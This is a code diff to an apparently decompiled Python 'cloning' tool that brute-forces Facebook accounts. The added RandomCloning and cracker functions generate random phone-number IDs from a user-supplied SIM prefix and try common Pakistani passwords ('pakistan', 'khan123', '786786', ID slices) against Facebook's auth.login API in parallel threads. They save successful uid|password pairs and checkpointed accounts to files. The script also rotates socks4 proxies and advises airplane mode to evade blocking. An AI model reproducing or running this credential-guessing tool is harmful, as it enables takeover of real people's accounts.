@@ -1,4 +1,4 @@
-#DECODED BY @arsalankhan && @arsalan_khan 
+#DECODED BY @arsalanking && @arsalan_khan 
 import requests
 import bs4
 import json
@@ -11,6 +11,8 @@ import re
 import urllib3
 import rich
 import base64
+import uuid
+import string
 from rich.table import Table as me
 from rich.panel import Panel
 from rich.console import Console as sol
@@ -25,10 +27,7 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON = sol()
-import os
 import platform
-import time
-import sys
 import socket
 
 dic = {
@@ -124,6 +123,10 @@ pwnya = []
 user = []
 logincookie = []
 apk_ck = []
+bou = []
+pcp = []
+apk = []
+
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
@@ -162,16 +165,26 @@ def linex():
 def info():
     print('\x1b[37m------------------------------------------------------------\n(\x1b[38;5;196m>>\x1b[37m) DEVLOPER  : \x1b[38;5;46mARSALAN\x1b[1;37m\n(\x1b[38;5;196m>>\x1b[37m) VERSION   :\x1b[38;5;46m 2.9 \x1b[38;5;46m \x1b[1;37m\n(\x1b[38;5;196m>>\x1b[37m) TOOL TYPE : \x1b[38;5;46mFILE > PUBLIC > RANDOM\n\x1b[37m------------------------------------------------------------')
 
-response = requests.get('https://api.ipify.org?format=json')
-ipadd = response.json()['ip']
+try:
+    response = requests.get('https://api.ipify.org?format=json')
+    ipadd = response.json()['ip']
+except:
+    ipadd = '127.0.0.1'
 
 def get_ip():
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    return ip_address
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        return ip_address
+    except:
+        return '127.0.0.1'
 
 ip = get_ip()
-sim = requests.get('http://ip-api.com/json/').json()['isp']
+try:
+    sim = requests.get('http://ip-api.com/json/').json()['isp']
+except:
+    sim = 'Unknown'
+
 current_time = datetime.datetime.now()
 current_hour = current_time.hour
 greeting = 'GOOD NIGHT     :'
@@ -479,7 +492,6 @@ def crackfree(idf, pwv):
             nip = random.choice(prox)
             proxs = {'http': 'socks4://' + nip}
             
-            # Updated Headers for free.facebook.com
             heade = {
                 'authority': 'm.facebook.com',
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -541,6 +553,96 @@ def crackfree(idf, pwv):
             
     loop += 1
 
+def RandomCloning():
+    os.system('clear')
+    banner()
+    linex()
+    print('\x1b[37m[+] EXAMPLE   : 0300,0301,9816 etc')
+    code = input('[+] SIM CODE  : ')
+    linex()
+    try:
+        limit = int(input('[+] EXAMPLE   : 5000,1000,15000\n[+] CRACK ID  : '))
+    except:
+        limit = 5000
+    linex()
+    for a in range(limit):
+        awm = ''.join(random.choice(string.digits) for _ in range(6))
+        bou.append(awm)
+    cpp = input('[+] SHOW CHECKPOINT ID [Y/N] : ')
+    linex()
+    if cpp in ('n', 'N', 'NO'):
+        pcp.append('n')
+    else:
+        pcp.append('y')
+    app = input('[+] SHOW APK && WEBSITE [Y/N] : ')
+    linex()
+    if app in ('N', 'n', 'No', 'NO'):
+        apk.append('n')
+    else:
+        apk.append('y')
+    AwmZone = tred(max_workers = 15)
+    os.system('clear')
+    banner()
+    linex()
+    print('\x1b[37m[+] TOTAL ID : \x1b[32m', str(len(bou)))
+    print('\x1b[37m[+] USE AIRPLANE MODE FOR GOOD RESULT')
+    linex()
+    for love in bou:
+        ids = code + love
+        passlist = [
+            ids[:6],
+            ids[:7],
+            ids[:8],
+            love,
+            ids[2:],
+            ids[3:],
+            'pakistan',
+            'khan123',
+            'ali123',
+            '786786',
+            '123456'
+        ]
+        AwmZone.submit(cracker, ids, passlist)
+    linex()
+    print(' The process has completed')
+    input(' Press enter to back ')
+    login()
+
+def cracker(ids, passlist):
+    global ok, cp, loop
+    sys.stdout.write(f'\r\r\x1b[37m[ARSALAN] {loop}|RANDOM \x1b[38;5;46m[OK-:{ok}]')
+    sys.stdout.flush()
+    for pas in passlist:
+        try:
+            data = {
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d' 
+            }
+            head = {
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9' 
+            }
+            po = requests.post('https://graph.facebook.com/auth/login', data = data, headers = head, verify = True).json()
+            if 'access_token' in po:
+                uid = str(po['uid'])
+                print(f'\r\r\x1b[38;5;46m[ARSALAN-OK] {uid} | {pas}')
+                open('/sdcard/ARSALAN-RNDM-OK.txt', 'a').write(uid + '|' + pas + '\n')
+                ok += 1
+                break
+            elif 'www.facebook.com' in str(po):
+                if 'y' in pcp:
+                    print(f'\r\r\x1b[38;5;196m [ARSALAN-CP] {ids} | {pas}')
+                open('/sdcard/ARSALAN-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                cp += 1
+                break
+        except:
+            pass
+    loop += 1
+
 def result():
     linex()
     os.system('clear')
@@ -573,10 +675,6 @@ def result():
         login()
     else:
         login()
-
-def RandomCloning():
-    animation('This option is under maintenance.')
-    login()
 
 if __name__ == '__main__':
     for folder in ['OK', 'CP', 'data']:
